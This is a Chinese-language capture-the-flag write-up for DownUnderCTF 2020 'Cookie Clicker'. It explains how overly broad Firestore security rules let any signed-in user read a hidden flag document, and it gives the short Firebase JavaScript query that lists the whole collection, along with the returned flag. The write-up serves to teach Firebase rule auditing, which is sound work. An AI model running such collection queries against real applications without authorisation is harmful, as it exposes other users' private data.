# DownUnderCTF 2020 - Cookie Clicker

## 题目简述

这是一个 Angular + Firebase 的点击游戏。普通用户登录后可以增加自己的点击数和全站总数。前端只读取 `cookies/total`，但 Firestore 安全规则允许已认证用户读取整个 `cookies` 集合，其中另一个文档保存了 flag。漏洞不在 Firebase 客户端配置公开本身，而在服务端规则授权范围大于界面所需范围。

## 解题过程

注册普通账号并观察点击请求，可以看到两个文档路径：

```text
users/<uid>
cookies/total
```

Angular 服务也明确订阅了：

```typescript
this.cookie$ = this.afs
  .doc<{cookieCount}>('cookies/total')
  .valueChanges();
```

Firebase Web 客户端必须在浏览器中携带项目标识，因此这些配置可从打包后的 `main.js` 或仓库的 `environment.ts` 取得。API key 只标识 Firebase 项目，真正的权限边界应由 Authentication 与 Firestore Security Rules 建立。

使用自己的已注册账号初始化同一项目，然后查询整个集合：

```html
<script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-firestore.js"></script>
<script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-auth.js"></script>
<script>
firebase.initializeApp({
  apiKey: "<environment.ts 中的 apiKey>",
  authDomain: "cookie-clicker1.firebaseapp.com",
  projectId: "cookie-clicker1"
});

async function solve() {
  await firebase.auth().signInWithEmailAndPassword(
    "your-account@example.com",
    "your-password"
  );

  const snapshot = await firebase.firestore().collection("cookies").get();
  snapshot.forEach(doc => console.log(doc.id, doc.data()));
}
solve();
</script>
```

比赛期间的返回中除了 `total`，还有：

```text
notaflag => {
  flag: "DUCTF{ok_it_is_a_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}"
}
```

因此 flag 为：

```text
DUCTF{ok_it_is_a_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
```

历史 Firebase 项目可能已经关闭；仓库中的官方 solution 保留了查询代码与完整响应，足以复现授权错误的机制与结果。

## 方法总结

前端没有显示某个文档，不代表客户端无权读取它。审计 Firebase 应用时，要从实际网络请求识别 collection/document 结构，再以普通账号测试规则对列表、单文档、创建、更新和删除分别授予了什么权限。客户端 API key 公开是正常设计，不能把它当作唯一漏洞；本题真正的问题是 `cookies` 集合的读取规则过宽。
